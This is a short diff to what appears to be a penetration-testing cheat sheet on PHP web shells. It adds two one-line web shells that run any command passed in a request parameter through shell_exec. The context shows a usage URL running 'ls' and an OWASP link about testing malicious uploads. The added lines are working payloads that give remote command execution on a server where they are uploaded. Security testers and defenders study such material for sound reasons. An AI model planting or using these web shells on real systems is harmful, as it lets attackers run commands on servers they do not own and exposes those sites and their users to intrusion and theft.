@@ -157,6 +157,12 @@ usage examples
 url/webshell.php?cmd=ls
 ```
 
+```
+<?php echo shell_exec($_REQUEST["Telepathy"]); ?>
+```
+```
+<?php echo shell_exec($_GET["Telepathy"]); ?>
+```
 ## PHP Webshell:
 https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
 ```
